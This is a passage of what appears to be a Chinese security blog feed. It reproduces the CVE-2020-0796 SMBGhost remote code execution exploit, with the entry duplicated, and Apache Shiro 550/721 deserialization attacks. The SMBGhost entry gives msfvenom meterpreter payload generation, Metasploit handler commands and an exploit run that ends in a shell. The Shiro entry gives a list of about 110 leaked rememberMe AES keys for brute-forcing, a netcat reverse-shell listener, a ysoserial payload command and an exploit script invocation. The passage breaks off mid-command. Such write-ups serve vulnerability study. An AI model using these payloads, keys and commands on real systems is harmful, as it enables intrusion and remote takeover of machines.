        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00漏洞介绍"><a href="#0x00漏洞介绍" class="headerlink" title="0x00漏洞介绍"></a>0x00漏洞介绍</h1><p>漏洞介绍</p><p>微软SMBv3 Client/Server远程代码执行漏洞CVE-2020-0796</p><p>影响范围：<br>Windows 10 Version 1903 for 32-bit Systems<br>Windows 10 Version 1903 for x64-based Systems<br>Windows 10 Version 1903 for ARM64-based Systems<br>Windows Server, Version 1903 (Server Core installation)<br>Windows 10 Version 1909 for 32-bit Systems<br>Windows 10 Version 1909 for x64-based Systems<br>Windows 10 Version 1909 for ARM64-based Systems<br>Windows Server, Version 1909 (Server Core installation)</p><h1 id="0x01复现坑点：坑点比较多看一下"><a href="#0x01复现坑点：坑点比较多看一下" class="headerlink" title="0x01复现坑点：坑点比较多看一下"></a>0x01复现坑点：坑点比较多看一下</h1><ul><li>Win10 版本有限制，具体我自己用的下面这个成功的</li></ul><p>ed2k://|file|cn_windows_10_business_editions_version_1903_updated_sept_2019_x64_dvd_2f5281e1.iso|5231140864|B1D5C4C401036B0B1EBA64476A95F338|/</p><ul><li>python 版本</li></ul><p>python 3.6 可以成功！</p><p>python 3.6 可以成功！</p><p>python 3.7 和 2 实测蓝屏</p><p>不懂为啥，有大佬知道可以指导一下弟弟</p><ul><li>payload要正向监听</li></ul><ul><li><p>补丁也有坑，KB4551762讲道理是没有，但是win10的补丁，看见就那几个，但是那个补丁里面可能有包含这个补丁</p></li><li><p>需要关闭defender防火墙 </p></li></ul><h1 id="0x02-复现过程"><a href="#0x02-复现过程" class="headerlink" title="0x02 复现过程"></a>0x02 复现过程</h1><p>首先使用systeminfo看一下补丁（KB4551762）</p><p>我新装的，肯定没啥问题，</p><ul><li>msf生成木马</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;4444 -b &#39;\x00&#39; -i 1 -f python</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDUxMTI5MTkucG5n?x-oss-process=image/format,png" alt="image-20200605112919799"></p><ul><li><p>EXP替换shellcode</p><p>把buf 替换成USER_PAYLOAD</p></li></ul><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDUxMTMwMzUucG5n?x-oss-process=image/format,png" alt="image-20200605113034988"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">set lport 6666</span><br><span class="line">set rhost 192.168.31.235</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDUxMTQ5MTEucG5n?x-oss-process=image/format,png" alt="image-20200605114911778"></p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-jp0qeeXU-1591336663812)(/Users/zy/Library/Application%20Support/typora-user-images/image-20200605114841642.png)]</p><p>运行EXP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py -ip 192.168.100.54</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDUxMTE0MTIucG5n?x-oss-process=image/format,png" alt="image-20200605111412505"></p><p>最终拿到shell</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDUxMzM5NDUucG5n?x-oss-process=image/format,png" alt="image-20200605133945470"></p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-0796_RCE漏洞exp复现(非蓝屏)</title>
      <link href="/2020/06/05/CVE-2020-0796_RCE%E6%BC%8F%E6%B4%9Eexp%E5%A4%8D%E7%8E%B0(%E9%9D%9E%E8%93%9D%E5%B1%8F)/"/>
      <url>/2020/06/05/CVE-2020-0796_RCE%E6%BC%8F%E6%B4%9Eexp%E5%A4%8D%E7%8E%B0(%E9%9D%9E%E8%93%9D%E5%B1%8F)/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00漏洞介绍"><a href="#0x00漏洞介绍" class="headerlink" title="0x00漏洞介绍"></a>0x00漏洞介绍</h1><p>漏洞介绍</p><p>微软SMBv3 Client/Server远程代码执行漏洞CVE-2020-0796</p><p>影响范围：<br>Windows 10 Version 1903 for 32-bit Systems<br>Windows 10 Version 1903 for x64-based Systems<br>Windows 10 Version 1903 for ARM64-based Systems<br>Windows Server, Version 1903 (Server Core installation)<br>Windows 10 Version 1909 for 32-bit Systems<br>Windows 10 Version 1909 for x64-based Systems<br>Windows 10 Version 1909 for ARM64-based Systems<br>Windows Server, Version 1909 (Server Core installation)</p><h1 id="0x01复现坑点：坑点比较多看一下"><a href="#0x01复现坑点：坑点比较多看一下" class="headerlink" title="0x01复现坑点：坑点比较多看一下"></a>0x01复现坑点：坑点比较多看一下</h1><p>EXP地址：</p><p><a href="https://github.com/chompie1337/SMBGhost\_RCE\_PoC" target="_blank" rel="noopener">https://github.com/chompie1337/SMBGhost\_RCE\_PoC</a></p><ul><li>Win10 版本有限制，具体我自己用的下面这个成功的</li></ul><p>ed2k://|file|cn_windows_10_business_editions_version_1903_updated_sept_2019_x64_dvd_2f5281e1.iso|5231140864|B1D5C4C401036B0B1EBA64476A95F338|/</p><ul><li>python 版本</li></ul><p>python 3.6 可以成功！</p><p>python 3.6 可以成功！</p><p>python 3.7 和 2 实测蓝屏</p><p>不懂为啥，有大佬知道可以指导一下弟弟</p><ul><li><p>payload要正向监听</p></li><li><p>补丁也有坑，KB4551762讲道理是没有，但是win10的补丁，看见就那几个，但是那个补丁里面可能有包含这个补丁</p></li><li><p>需要关闭defender防火墙</p></li></ul><h1 id="0x02-复现过程"><a href="#0x02-复现过程" class="headerlink" title="0x02 复现过程"></a>0x02 复现过程</h1><p>首先使用systeminfo看一下补丁（KB4551762）</p><p>我新装的，肯定没啥问题，</p><ul><li>msf生成木马</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;4444 -b &#39;\x00&#39; -i 1 -f python</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDUxMTI5MTkucG5n?x-oss-process=image/format,png" alt="image-20200605112919799"></p><ul><li><p>EXP替换shellcode</p><p>把buf 替换成USER_PAYLOAD</p></li></ul><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDUxMTMwMzUucG5n?x-oss-process=image/format,png" alt="image-20200605113034988"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">set lport 6666</span><br><span class="line">set rhost 192.168.31.235</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDUxMTQ5MTEucG5n?x-oss-process=image/format,png" alt="image-20200605114911778"><br><img src="https://img-blog.csdnimg.cn/20200629164706690.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>运行EXP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py -ip 192.168.100.54</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDUxMTE0MTIucG5n?x-oss-process=image/format,png" alt="image-20200605111412505"></p><p>最终拿到shell</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDUxMzM5NDUucG5n?x-oss-process=image/format,png" alt="image-20200605133945470"></p>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>红队武器库-Apache Shiro 反序列化漏洞</title>
      <link href="/2020/06/03/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93-Apache%20Shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/06/03/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93-Apache%20Shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="Apache-Shiro-RememberMe-反序列化（Shiro550）"><a href="#Apache-Shiro-RememberMe-反序列化（Shiro550）" class="headerlink" title="Apache Shiro RememberMe 反序列化（Shiro550）"></a>Apache Shiro RememberMe 反序列化（Shiro550）</h1><p>Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。</p><h2 id="影响组件"><a href="#影响组件" class="headerlink" title="影响组件"></a>影响组件</h2><p>Apache Shiro &lt;= 1.2.4</p><h2 id="实际漏洞影响范围"><a href="#实际漏洞影响范围" class="headerlink" title="实际漏洞影响范围"></a>实际漏洞影响范围</h2><p>如果shiro的rememberMe功能的AES密钥被泄露, 就会导致反序列化漏洞，无论Shiro是什么版本。</p><h2 id="目前网上收集到的密钥"><a href="#目前网上收集到的密钥" class="headerlink" title="目前网上收集到的密钥"></a>目前网上收集到的密钥</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</span><br><span class="line">wGiHplamyXlVB11UXWol8g&#x3D;&#x3D;</span><br><span class="line">2AvVhdsgUs0FSA3SDFAdag&#x3D;&#x3D;</span><br><span class="line">4AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">fCq+&#x2F;xW488hMTCD+cmJ3aQ&#x3D;&#x3D;</span><br><span class="line">3AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">1QWLxg+NYmxraMoxAXu&#x2F;Iw&#x3D;&#x3D;</span><br><span class="line">ZUdsaGJuSmxibVI2ZHc9PQ&#x3D;&#x3D;</span><br><span class="line">Z3VucwAAAAAAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">U3ByaW5nQmxhZGUAAAAAAA&#x3D;&#x3D;</span><br><span class="line">6ZmI6I2j5Y+R5aSn5ZOlAA&#x3D;&#x3D;</span><br><span class="line">kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</span><br><span class="line">4AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">Z3VucwAAAAAAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">fCq+&#x2F;xW488hMTCD+cmJ3aQ&#x3D;&#x3D;</span><br><span class="line">0AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">1AvVhdsgUs0FSA3SDFAdag&#x3D;&#x3D;</span><br><span class="line">1QWLxg+NYmxraMoxAXu&#x2F;Iw&#x3D;&#x3D;</span><br><span class="line">25BsmdYwjnfcWmnhAciDDg&#x3D;&#x3D;</span><br><span class="line">2AvVhdsgUs0FSA3SDFAdag&#x3D;&#x3D;</span><br><span class="line">3AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">3JvYhmBLUs0ETA5Kprsdag&#x3D;&#x3D;</span><br><span class="line">r0e3c16IdVkouZgk1TKVMg&#x3D;&#x3D;</span><br><span class="line">5aaC5qKm5oqA5pyvAAAAAA&#x3D;&#x3D;</span><br><span class="line">5AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">6AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">6NfXkC7YVCV5DASIrEm1Rg&#x3D;&#x3D;</span><br><span class="line">6ZmI6I2j5Y+R5aSn5ZOlAA&#x3D;&#x3D;</span><br><span class="line">cmVtZW1iZXJNZQAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">7AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">8AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">8BvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">9AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">OUHYQzxQ&#x2F;W9e&#x2F;UjiAGu6rg&#x3D;&#x3D;</span><br><span class="line">a3dvbmcAAAAAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">aU1pcmFjbGVpTWlyYWNsZQ&#x3D;&#x3D;</span><br><span class="line">bWljcm9zAAAAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">bWluZS1hc3NldC1rZXk6QQ&#x3D;&#x3D;</span><br><span class="line">bXRvbnMAAAAAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">ZUdsaGJuSmxibVI2ZHc9PQ&#x3D;&#x3D;</span><br><span class="line">wGiHplamyXlVB11UXWol8g&#x3D;&#x3D;</span><br><span class="line">U3ByaW5nQmxhZGUAAAAAAA&#x3D;&#x3D;</span><br><span class="line">MTIzNDU2Nzg5MGFiY2RlZg&#x3D;&#x3D;</span><br><span class="line">L7RioUULEFhRyxM7a2R&#x2F;Yg&#x3D;&#x3D;</span><br><span class="line">a2VlcE9uR29pbmdBbmRGaQ&#x3D;&#x3D;</span><br><span class="line">WcfHGU25gNnTxTlmJMeSpw&#x3D;&#x3D;</span><br><span class="line">OY&#x2F;&#x2F;C4rhfwNxCQAQCrQQ1Q&#x3D;&#x3D;</span><br><span class="line">5J7bIJIV0LQSN3c9LPitBQ&#x3D;&#x3D;</span><br><span class="line">f&#x2F;SY5TIve5WWzT4aQlABJA&#x3D;&#x3D;</span><br><span class="line">bya2HkYo57u6fWh5theAWw&#x3D;&#x3D;</span><br><span class="line">WuB+y2gcHRnY2Lg9+Aqmqg&#x3D;&#x3D;</span><br><span class="line">kPv59vyqzj00x11LXJZTjJ2UHW48jzHN</span><br><span class="line">3qDVdLawoIr1xFd6ietnwg&#x3D;&#x3D;</span><br><span class="line">ZWvohmPdUsAWT3&#x3D;KpPqda</span><br><span class="line">YI1+nBV&#x2F;&#x2F;m7ELrIyDHm6DQ&#x3D;&#x3D;</span><br><span class="line">6Zm+6I2j5Y+R5aS+5ZOlAA&#x3D;&#x3D;</span><br><span class="line">2A2V+RFLUs+eTA3Kpr+dag&#x3D;&#x3D;</span><br><span class="line">6ZmI6I2j3Y+R1aSn5BOlAA&#x3D;&#x3D;</span><br><span class="line">SkZpbmFsQmxhZGUAAAAAAA&#x3D;&#x3D;</span><br><span class="line">2cVtiE83c4lIrELJwKGJUw&#x3D;&#x3D;</span><br><span class="line">fsHspZw&#x2F;92PrS3XrPW+vxw&#x3D;&#x3D;</span><br><span class="line">XTx6CKLo&#x2F;SdSgub+OPHSrw&#x3D;&#x3D;</span><br><span class="line">sHdIjUN6tzhl8xZMG3ULCQ&#x3D;&#x3D;</span><br><span class="line">O4pdf+7e+mZe8NyxMTPJmQ&#x3D;&#x3D;</span><br><span class="line">HWrBltGvEZc14h9VpMvZWw&#x3D;&#x3D;</span><br><span class="line">rPNqM6uKFCyaL10AK51UkQ&#x3D;&#x3D;</span><br><span class="line">Y1JxNSPXVwMkyvES&#x2F;kJGeQ&#x3D;&#x3D;</span><br><span class="line">lT2UvDUmQwewm6mMoiw4Ig&#x3D;&#x3D;</span><br><span class="line">MPdCMZ9urzEA50JDlDYYDg&#x3D;&#x3D;</span><br><span class="line">xVmmoltfpb8tTceuT5R7Bw&#x3D;&#x3D;</span><br><span class="line">c+3hFGPjbgzGdrC+MHgoRQ&#x3D;&#x3D;</span><br><span class="line">ClLk69oNcA3m+s0jIMIkpg&#x3D;&#x3D;</span><br><span class="line">Bf7MfkNR0axGGptozrebag&#x3D;&#x3D;</span><br><span class="line">1tC&#x2F;xrDYs8ey+sa3emtiYw&#x3D;&#x3D;</span><br><span class="line">ZmFsYWRvLnh5ei5zaGlybw&#x3D;&#x3D;</span><br><span class="line">cGhyYWNrY3RmREUhfiMkZA&#x3D;&#x3D;</span><br><span class="line">IduElDUpDDXE677ZkhhKnQ&#x3D;&#x3D;</span><br><span class="line">yeAAo1E8BOeAYfBlm4NG9Q&#x3D;&#x3D;</span><br><span class="line">cGljYXMAAAAAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">2itfW92XazYRi5ltW0M2yA&#x3D;&#x3D;</span><br><span class="line">XgGkgqGqYrix9lI6vxcrRw&#x3D;&#x3D;</span><br><span class="line">ertVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">5AvVhmFLUS0ATA4Kprsdag&#x3D;&#x3D;</span><br><span class="line">s0KTA3mFLUprK4AvVhsdag&#x3D;&#x3D;</span><br><span class="line">hBlzKg78ajaZuTE0VLzDDg&#x3D;&#x3D;</span><br><span class="line">9FvVhtFLUs0KnA3Kprsdyg&#x3D;&#x3D;</span><br><span class="line">d2ViUmVtZW1iZXJNZUtleQ&#x3D;&#x3D;</span><br><span class="line">yNeUgSzL&#x2F;CfiWw1GALg6Ag&#x3D;&#x3D;</span><br><span class="line">NGk&#x2F;3cQ6F5&#x2F;UNPRh8LpMIg&#x3D;&#x3D;</span><br><span class="line">4BvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">MzVeSkYyWTI2OFVLZjRzZg&#x3D;&#x3D;</span><br><span class="line">CrownKey&#x3D;&#x3D;a12d&#x2F;dakdad</span><br><span class="line">empodDEyMwAAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">A7UzJgh1+EWj5oBFi+mSgw&#x3D;&#x3D;</span><br><span class="line">YTM0NZomIzI2OTsmIzM0NTueYQ&#x3D;&#x3D;</span><br><span class="line">c2hpcm9fYmF0aXMzMgAAAA&#x3D;&#x3D;</span><br><span class="line">i45FVt72K2kLgvFrJtoZRw&#x3D;&#x3D;</span><br><span class="line">U3BAbW5nQmxhZGUAAAAAAA&#x3D;&#x3D;</span><br><span class="line">ZnJlc2h6Y24xMjM0NTY3OA&#x3D;&#x3D;</span><br><span class="line">Jt3C93kMR9D5e8QzwfsiMw&#x3D;&#x3D;</span><br><span class="line">MTIzNDU2NzgxMjM0NTY3OA&#x3D;&#x3D;</span><br><span class="line">vXP33AonIp9bFwGl7aT7rA&#x3D;&#x3D;</span><br><span class="line">V2hhdCBUaGUgSGVsbAAAAA&#x3D;&#x3D;</span><br><span class="line">Z3h6eWd4enklMjElMjElMjE&#x3D;</span><br><span class="line">Q01TX0JGTFlLRVlfMjAxOQ&#x3D;&#x3D;</span><br><span class="line">ZAvph3dsQs0FSL3SDFAdag&#x3D;&#x3D;</span><br><span class="line">Is9zJ3pzNh2cgTHB4ua3+Q&#x3D;&#x3D;</span><br><span class="line">NsZXjXVklWPZwOfkvk6kUA&#x3D;&#x3D;</span><br><span class="line">GAevYnznvgNCURavBhCr1w&#x3D;&#x3D;</span><br><span class="line">66v1O8keKNV3TTcGPK1wzg&#x3D;&#x3D;</span><br><span class="line">SDKOLKn2J1j&#x2F;2BHjeZwAoQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>推荐工具 <a href="https://github.com/feihong-cs/ShiroExploit\_GUI/" target="_blank" rel="noopener">https://github.com/feihong-cs/ShiroExploit\_GUI/</a></p><p>环境搭建：推荐docker</p><p>简单检测，抓包重放后，如果显示rememberMe=deleteMe，说明有可利用性</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MjYxNDMyMDYucG5n?x-oss-process=image/format,png" alt="image-20200526143206170"></p><h3 id="Shiro550无需提供rememberMe-Cookie"><a href="#Shiro550无需提供rememberMe-Cookie" class="headerlink" title="Shiro550无需提供rememberMe Cookie"></a>Shiro550无需提供rememberMe Cookie</h3><p>因为该漏洞没有回显, 所以我们需要先确认漏洞是否存在</p><p>这里用DNS解析记录来做判断, 在<a href="http://www.dnslog.cn/上获取子域" target="_blank" rel="noopener">http://www.dnslog.cn/上获取子域</a></p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-qMyl0JGb-1591176591939)(<a href="https://gitee.com/godzeo/blogimg/raw/master/img/20200526134702.png\)\]" target="_blank" rel="noopener">https://gitee.com/godzeo/blogimg/raw/master/img/20200526134702.png\)\]</a></p><p>VPS启动一个nc -lvp 666</p><p>反弹shell</p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-E2Ywd8hN-1591176591940)(<a href="https://gitee.com/godzeo/blogimg/raw/master/img/20200526135057.png\)\]" target="_blank" rel="noopener">https://gitee.com/godzeo/blogimg/raw/master/img/20200526135057.png\)\]</a></p><p>成功</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MjYxMzUyMjEucG5n?x-oss-process=image/format,png" alt="image-20200526135221232"></p><h1 id="Apache-Shiro-Padding-Oracle-Attack-Shiro-721"><a href="#Apache-Shiro-Padding-Oracle-Attack-Shiro-721" class="headerlink" title="Apache Shiro Padding Oracle Attack (Shiro-721)"></a>Apache Shiro Padding Oracle Attack (Shiro-721)</h1><p>Apache Shiro 是企业常见的 Java安全框架, 由于<code>Shiro</code>使用<code>AES-CBC</code>模式进行加解密处理, 所以存在<code>Padding Oracle Attack</code>漏洞, 已经登录的攻击者同样可以进行反序列化操作</p><h2 id="影响组件-1"><a href="#影响组件-1" class="headerlink" title="影响组件"></a>影响组件</h2><p>Apache Shiro &lt; 1.4.2</p><p>Apache Shiro 1.2.5, 1.2.6, 1.3.0, 1.3.1, 1.3.2, 1.4.0-RC2, 1.4.0, 1.4.1</p><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>shiro 环境war包 <a href="https://github.com/jas502n/SHIRO-721" target="_blank" rel="noopener">https://github.com/jas502n/SHIRO-721</a></p><p>搭建环境 tomcat7 + shiro 1.4.1</p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-s52cCJP5-1591176591942)(<a href="https://gitee.com/godzeo/blogimg/raw/master/img/20200527140205.png\)\]" target="_blank" rel="noopener">https://gitee.com/godzeo/blogimg/raw/master/img/20200527140205.png\)\]</a></p><p>该漏洞需要登录后获取到合法的<code>Cookie: rememberMe=XXX</code>后才可以进行利用</p><p>看起来不是很好利用但实际上有一些网站是开放注册的</p><p>而且这个洞不需要知道服务端密钥，因为该漏洞需是爆破Cookie</p><p>访问shiro登录页面，并登陆</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MjcxNDAzMDAucG5n?x-oss-process=image/format,png" alt="image-20200527140300087"></p><p>登陆后，访问一个业务，抓包</p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-2EvvYPE2-1591176591943)(<a href="https://gitee.com/godzeo/blogimg/raw/master/img/20200526145750.png\)\]" target="_blank" rel="noopener">https://gitee.com/godzeo/blogimg/raw/master/img/20200526145750.png\)\]</a></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MjcxNDA0MDcucG5n?x-oss-process=image/format,png" alt="image-20200527140407681"></p><p>按照要求填入 rememberMe Cookie</p><p>图形化工具失败，不知道怎么回事，利用原始的方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 &#39;touch &#x2F;tmp&#x2F;zeo&#39; &gt; payload.class</span><br></pre></td></tr></table></figure><p>exp 下载地址 <a href="https://github.com/Geekby/shiro\_rce\_exp" target="_blank" rel="noopener">https://github.com/Geekby/shiro\_rce\_exp</a></p><p>执行exp爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro_exp.py http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;samples-web-1.4.1&#x2F; 